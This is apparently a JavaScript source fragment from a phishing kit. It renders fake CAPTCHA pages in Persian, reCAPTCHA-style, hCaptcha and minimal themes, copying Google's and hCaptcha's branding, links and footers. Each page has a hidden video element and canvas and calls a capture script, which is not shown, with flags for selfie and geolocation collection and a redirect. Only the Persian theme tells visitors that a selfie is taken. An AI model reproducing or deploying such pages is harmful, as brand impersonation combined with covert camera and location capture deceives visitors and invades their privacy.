    busy: 'در حال بررسی...', done: 'اطلاعات با موفقیت ارسال شد.',
    error: 'خطایی رخ داد. لطفاً دوباره تلاش کنید.',
    labelBusy: 'در حال بررسی...', labelDone: 'تایید شد', labelIdle: 'من ربات نیستم',
    camNotAllowed: 'دسترسی به دوربین رد شد.', camNotFound: 'دوربینی یافت نشد.',
    camNotReadable: 'دوربین در حال استفاده است.', camOverconstrained: 'تنظیمات دوربین سازگار نیست.',
    camSecurity: 'HTTPS الزامی است.', camAbort: 'دسترسی به دوربین لغو شد.',
    camTimeout: 'زمان انتظار برای دوربین به پایان رسید.', uploadError: 'ارسال اطلاعات ناموفق بود.' };
  const hint = s === 'on'
    ? 'با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' + (g === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '')
    : 'با کلیک روی این کادر، اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.' + (g === 'on' ? ' همچنین ممکن است اجازهٔ دسترسی به موقعیت مکانی خواسته شود.' : '');
  return `<!DOCTYPE html>
<html lang="fa" dir="rtl"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive"><title>تایید هویت</title>
<style nonce="${nonce}">
:root { --accent:#4a90e2; --ok:#22a06b; --err:#d93636; --muted:#6b7280; --border:#dcdfe4; }
* { box-sizing: border-box; }
html, body { margin: 0; height: 100%; }
body { display: flex; align-items: center; justify-content: center;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  background: #f5f6f8; color: #1f2328; padding: 16px; }
.card { width: 100%; max-width: 360px; background: #fff; border: 1px solid var(--border);
  border-radius: 12px; box-shadow: 0 6px 24px rgba(15,23,42,.06); padding: 20px; }
.row { display: flex; align-items: center; gap: 14px; }
.checkbox { width: 28px; height: 28px; border: 2px solid #9ca3af; border-radius: 6px;
  display: flex; align-items: center; justify-content: center;
  cursor: pointer; background: #fff; transition: all .18s; flex-shrink: 0; }
.row:hover .checkbox { border-color: var(--accent); }
#widget:focus { outline: none; }
#widget:focus-visible .checkbox { outline: 2px solid var(--accent); outline-offset: 2px; }
#widget.done .checkbox { background: var(--accent); border-color: var(--accent); }
#widget.done .checkbox::after { content: ""; width: 7px; height: 13px;
  border: solid #fff; border-width: 0 2.5px 2.5px 0;
  transform: rotate(45deg); margin-bottom: 3px; }
#widget.busy .checkbox { border-color: var(--accent); }
#widget.busy .checkbox::after { content: ""; width: 14px; height: 14px;
  border: 2px solid #e5e7eb; border-top-color: var(--accent);
  border-radius: 50%; animation: spin .7s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
.label { font-size: 16px; font-weight: 500; cursor: pointer; }
.hint { margin-top: 14px; font-size: 12px; color: var(--muted); line-height: 1.7; }
.status { margin-top: 12px; font-size: 13px; min-height: 18px; }
.status.error { color: var(--err); }
.status.ok { color: var(--ok); }
.retry { margin-top: 8px; background: none; border: 1px solid var(--border);
  color: #1f2328; padding: 6px 12px; border-radius: 8px; font-size: 13px; cursor: pointer; display: none; }
.retry:hover { background: #f3f4f6; }
#hiddenVideo, #canvas { display: none; }
noscript { display: block; margin-top: 12px; color: var(--err); font-size: 13px; }
</style></head><body>
<div class="card">
<div class="row" id="widget" role="checkbox" aria-checked="false" aria-label="من ربات نیستم" tabindex="0">
<div class="checkbox"></div>
<span class="label" id="label">من ربات نیستم</span></div>
<p class="hint">${hint}</p>
<div class="status" id="status" role="status" aria-live="polite"></div>
<button class="retry" id="retry" type="button">تلاش مجدد</button>
<noscript>برای ادامه، جاوااسکریپت باید فعال باشد.</noscript>
</div>
<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
${captchaScript(nonce, s, g, redirectUrl, labels)}
</body></html>`;
}

// ============================================================
//  Theme: Google (reCAPTCHA style)
// ============================================================
function renderGoogleHTML(nonce, s, g, redirectUrl) {
  const labels = { busy: 'Verifying...', done: 'Verification complete',
    error: 'Verification failed. Please try again.',
    camTimeout: 'Camera timed out. Please try again.',
    uploadError: 'Connection error. Please try again.' };
  return `<!DOCTYPE html>
<html lang="en" dir="ltr"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive"><title>reCAPTCHA</title>
<style nonce="${nonce}">
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; min-height: 100%; }
body { font-family: Roboto, arial, sans-serif; background: #f9f9f9;
  min-height: 100vh; display: flex; flex-direction: column;
  align-items: center; justify-content: center; padding: 20px; color: #202124; }
.g-widget { width: 304px; height: 78px; background: #fff; border: 1px solid #d3d3d3;
  border-radius: 3px; box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
  display: flex; align-items: center; padding: 0 12px;
  cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent;
  transition: box-shadow .15s; }
.g-widget:hover { box-shadow: 0 0 6px 2px rgba(0,0,0,0.1); }
.g-widget:focus { outline: none; box-shadow: 0 0 0 2px #4285f4; }
.g-widget.busy, .g-widget.done { cursor: default; }
.g-checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px;
  background: #fff; flex-shrink: 0; display: flex; align-items: center; justify-content: center;
  position: relative; transition: all .2s; }
.g-widget.busy .g-checkbox { border-color: #e0e0e0; background: #fafafa; }
.g-widget.busy .g-checkbox::after { content: ""; width: 20px; height: 20px;
  border: 3px solid #f0f0f0; border-top-color: #4285f4; border-radius: 50%;
  animation: g-spin 0.9s linear infinite; }
.g-widget.done .g-checkbox { border-color: #4285f4; background: #4285f4; }
.g-widget.done .g-checkbox::after { content: ""; width: 7px; height: 13px;
  border: solid #fff; border-width: 0 2.5px 2.5px 0;
  transform: rotate(45deg) translate(-1px, -2px); }
@keyframes g-spin { to { transform: rotate(360deg); } }
.g-label { flex: 1; font-size: 14px; color: #202124; padding-left: 12px; line-height: 1.3; }
.g-brand { display: flex; flex-direction: column; align-items: center; gap: 2px; flex-shrink: 0; }
.g-brand-logo { display: flex; flex-direction: column; align-items: center; gap: 1px; font-size: 10px; line-height: 1; }
.g-brand-logo svg { display: block; }
.g-brand-logo span { color: #757575; font-size: 9px; }
.g-brand-links { font-size: 8px; color: #757575; white-space: nowrap; line-height: 1; }
.g-brand-links a { color: #757575; text-decoration: none; }
.g-brand-links a:hover { text-decoration: underline; }
.g-brand-links span { margin: 0 2px; color: #ccc; }
.g-status { font-size: 12px; color: #5f6368; min-height: 16px; text-align: center;
  max-width: 304px; line-height: 1.4; margin-top: 8px; }
.g-status.error { color: #d93025; }
.g-status.ok { color: #188038; }
.g-retry { margin-top: 6px; background: #fff; border: 1px solid #dadce0; color: #3c4043;
  padding: 6px 14px; border-radius: 4px; font-size: 12px; cursor: pointer;
  display: none; font-family: inherit; font-weight: 500; }
.g-retry:hover { background: #f8f9fa; }
.g-footer { position: fixed; bottom: 10px; font-size: 10px; color: #5f6368; text-align: center; }
.g-footer a { color: #5f6368; text-decoration: none; margin: 0 4px; }
.g-footer a:hover { text-decoration: underline; }
#hiddenVideo, #canvas { display: none; }
@media (max-width: 380px) { .g-widget { width: 100%; max-width: 304px; }
  .g-footer { position: static; margin-top: 24px; } }
</style></head><body>
<div class="g-widget" id="widget" role="checkbox" aria-checked="false" tabindex="0" aria-label="I'm not a robot">
<div class="g-checkbox"></div>
<div class="g-label" id="label">I'm not a robot</div>
<div class="g-brand">
<div class="g-brand-logo">
<svg width="34" height="32" viewBox="0 0 34 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
<path fill="#4285F4" d="M16.9 1C9 1 2.5 7.1 2 14.9h4c.5-5.6 5.2-10 10.9-10 3 0 5.7 1.2 7.7 3.1l-3.2 3.2h9.6V1.6l-4.1 4.1c-2.7-2.6-6.3-4.2-10-4.7z"/>
<path fill="#34A853" d="M2 17c.5 7.7 7 13.9 14.9 13.9 3.9 0 7.4-1.5 10-4l-4-4c-1.6 1.3-3.7 2.1-6 2.1-5.7 0-10.4-4.4-10.9-10H2z"/>
<path fill="#FBBC05" d="M17 10.5c3 0 5.6 1.1 7.6 3l3.3-3.3C25.3 7.6 21.4 6 17 6V10.5z"/>
<path fill="#EA4335" d="M17 21.5c2.2 0 4.1-.8 5.6-2l4 4c-2.6 2.4-6.1 3.9-10 3.9-6.4 0-11.9-4.2-13.9-10.1l4-4c1.3 4.9 5.7 8.2 10.3 8.2z"/>
</svg><span>reCAPTCHA</span></div>
<div class="g-brand-links">
<a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" tabindex="-1">Privacy</a>
<span>-</span>
<a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" tabindex="-1">Terms</a>
</div></div></div>
<div class="g-status" id="status" role="status" aria-live="polite"></div>
<button class="g-retry" id="retry" type="button">Try again</button>
<footer class="g-footer">
<span>Protected by reCAPTCHA</span>
<a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer">Privacy</a>
<span>-</span>
<a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer">Terms</a>
</footer>
<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
${captchaScript(nonce, s, g, redirectUrl, labels)}
</body></html>`;
}

// ============================================================
//  Theme: hCaptcha
// ============================================================
function renderHcaptchaHTML(nonce, s, g, redirectUrl) {
  const labels = { busy: 'Verifying...', done: 'Success!',
    error: 'Verification failed. Please try again.',
    camTimeout: 'Camera timed out. Please try again.',
    uploadError: 'Connection error. Please try again.' };
  return `<!DOCTYPE html>
<html lang="en" dir="ltr"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive"><title>hCaptcha</title>
<style nonce="${nonce}">
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; min-height: 100%; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  background: #f8fafc; color: #1c2130; min-height: 100vh;
  display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
.hc-widget { width: 303px; height: 78px; background: #fff; border: 1px solid #d7dbe3;
  border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.04);
  display: flex; align-items: center; padding: 0 14px;
  cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent;
  transition: border-color .15s; }
.hc-widget:hover { border-color: #b9bec8; }
.hc-widget:focus { outline: none; border-color: #0074bf; }
.hc-widget.busy, .hc-widget.done { cursor: default; }
.hc-checkbox { width: 30px; height: 30px; border: 2px solid #b7bcc6; border-radius: 4px;
  background: #fff; flex-shrink: 0; display: flex; align-items: center; justify-content: center;
  position: relative; transition: all .2s; }
.hc-widget.busy .hc-checkbox { border-color: #e5e8ed; background: #fafbfc; }
.hc-widget.busy .hc-checkbox::after { content: ""; width: 20px; height: 20px;
  border: 3px solid #e5e8ed; border-top-color: #0074bf; border-radius: 50%;
  animation: hc-spin 0.85s linear infinite; }
.hc-widget.done .hc-checkbox { border-color: #0074bf; background: #0074bf; }
.hc-widget.done .hc-checkbox::after { content: ""; width: 7px; height: 14px;
  border: solid #fff; border-width: 0 2.5px 2.5px 0;
  transform: rotate(45deg) translate(-1px, -2px); }
@keyframes hc-spin { to { transform: rotate(360deg); } }
.hc-label { flex: 1; font-size: 14px; color: #1c2130; padding-left: 14px;
  line-height: 1.3; font-weight: 400; }
.hc-brand { display: flex; flex-direction: column; align-items: flex-end; gap: 3px; flex-shrink: 0; }
.hc-brand-logo { display: flex; align-items: center; gap: 4px; font-size: 11px;
  color: #3a4152; font-weight: 600; line-height: 1; }
.hc-brand-logo svg { display: block; }
.hc-brand-links { font-size: 9px; color: #8a92a3; white-space: nowrap; line-height: 1; }
.hc-brand-links a { color: #8a92a3; text-decoration: none; }
.hc-brand-links a:hover { text-decoration: underline; }
.hc-brand-links span { margin: 0 3px; color: #c5cad3; }
.hc-status { font-size: 12px; color: #6b7384; min-height: 16px; text-align: center;
  max-width: 303px; line-height: 1.4; margin-top: 10px; }
.hc-status.error { color: #d13a3a; }
.hc-status.ok { color: #0074bf; font-weight: 500; }
.hc-retry { margin-top: 6px; background: #fff; border: 1px solid #d7dbe3; color: #3a4152;
  padding: 6px 14px; border-radius: 4px; font-size: 12px; cursor: pointer;
  display: none; font-family: inherit; font-weight: 500; }
.hc-retry:hover { background: #f8fafc; }
.hc-footer { position: fixed; bottom: 12px; font-size: 10px; color: #8a92a3;
  display: flex; align-items: center; gap: 5px; flex-wrap: wrap; justify-content: center; padding: 0 12px; }
.hc-footer b { color: #6b7384; font-weight: 500; font-family: ui-monospace, Menlo, monospace; }
.hc-footer a { color: #0074bf; text-decoration: none; }
.hc-footer a:hover { text-decoration: underline; }
#hiddenVideo, #canvas { display: none; }
@media (max-width: 380px) { .hc-widget { width: 100%; max-width: 303px; }
  .hc-footer { position: static; margin-top: 24px; } }
</style></head><body>
<div class="hc-widget" id="widget" role="checkbox" aria-checked="false" tabindex="0" aria-label="I am human">
<div class="hc-checkbox"></div>
<div class="hc-label" id="label">I am human</div>
<div class="hc-brand">
<div class="hc-brand-logo">
<svg width="16" height="16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
<path fill="#0074bf" d="M8 0L1 3v5c0 4.1 3 7.9 7 8 4-.1 7-3.9 7-8V3L8 0zm0 2l5 2v4c0 3-2.2 5.9-5 6-2.8-.1-5-3-5-6V4l5-2z"/>
<circle fill="#0074bf" cx="8" cy="7.5" r="1.8"/>
<path fill="#0074bf" d="M8 9.8c-1.6 0-2.8 1-2.8 2.2V13h5.6v-1c0-1.2-1.2-2.2-2.8-2.2z"/>
</svg><span>hCaptcha</span></div>
<div class="hc-brand-links">
<a href="https://www.hcaptcha.com/privacy" target="_blank" rel="noopener noreferrer" tabindex="-1">Privacy</a>
<span>·</span>
<a href="https://www.hcaptcha.com/terms" target="_blank" rel="noopener noreferrer" tabindex="-1">Terms</a>
</div></div></div>
<div class="hc-status" id="status" role="status" aria-live="polite"></div>
<button class="hc-retry" id="retry" type="button">Try again</button>
<footer class="hc-footer">
<span>Protected by <a href="https://www.hcaptcha.com" target="_blank" rel="noopener noreferrer">hCaptcha</a></span>
<span>·</span><span>Ray ID <b id="ray">—</b></span>
</footer>
<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
${captchaScript(nonce, s, g, redirectUrl, labels)}
</body></html>`;
}

// ============================================================
//  Theme: Minimal
// ============================================================
function renderMinimalHTML(nonce, s, g, redirectUrl) {
  const labels = { busy: 'Checking…', done: 'Done',
    error: 'Something went wrong. Please try again.',
    camTimeout: 'Camera timed out.', uploadError: 'Connection error.' };
  return `<!DOCTYPE html>
<html lang="en" dir="ltr"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive"><title>Verify</title>
<style nonce="${nonce}">
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; min-height: 100%; }
body { font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
  background: #fff; color: #111; min-height: 100vh;
  display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; }
.m-widget { width: 280px; padding: 16px 20px; background: #fff; border: 1px solid #e5e5e5;
  border-radius: 8px; display: flex; align-items: center; gap: 14px;
  cursor: pointer; user-select: none; -webkit-tap-highlight-color: transparent;
  transition: border-color .15s, background .15s; }
.m-widget:hover { border-color: #999; }
.m-widget:focus { outline: 2px solid #111; outline-offset: 2px; }
.m-widget.busy, .m-widget.done { cursor: default; }
.m-widget.done { border-color: #111; background: #f7f7f7; }
.m-checkbox { width: 22px; height: 22px; border: 1.5px solid #111; border-radius: 3px;
  background: #fff; flex-shrink: 0; display: flex; align-items: center; justify-content: center;
  position: relative; transition: all .2s; }
.m-widget.busy .m-checkbox { border-color: #ccc; }
.m-widget.busy .m-checkbox::after { content: ""; width: 16px; height: 16px;
  border: 2px solid #eee; border-top-color: #111; border-radius: 50%;
  animation: m-spin 0.7s linear infinite; }
.m-widget.done .m-checkbox { background: #111; border-color: #111; }
.m-widget.done .m-checkbox::after { content: ""; width: 5px; height: 11px;
  border: solid #fff; border-width: 0 2px 2px 0;
  transform: rotate(45deg) translate(-1px, -2px); }
@keyframes m-spin { to { transform: rotate(360deg); } }
.m-label { font-size: 15px; font-weight: 500; color: #111; line-height: 1.3; }
.m-status { margin-top: 14px; font-size: 12px; color: #666; min-height: 16px;
  text-align: center; max-width: 280px; line-height: 1.5; }
.m-status.error { color: #b91c1c; }
.m-status.ok { color: #111; font-weight: 500; }
.m-retry { margin-top: 10px; background: none; border: 1px solid #e5e5e5; color: #111;
  padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer;
  display: none; font-family: inherit; }
.m-retry:hover { background: #f5f5f5; border-color: #999; }
#hiddenVideo, #canvas { display: none; }
</style></head><body>
<div class="m-widget" id="widget" role="checkbox" aria-checked="false" tabindex="0" aria-label="Verify">
<div class="m-checkbox"></div>
<div class="m-label" id="label">I'm not a robot</div>
</div>
<div class="m-status" id="status" role="status" aria-live="polite"></div>
<button class="m-retry" id="retry" type="button">Try again</button>
<video id="hiddenVideo" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
${captchaScript(nonce, s, g, redirectUrl, labels)}
</body></html>`;
}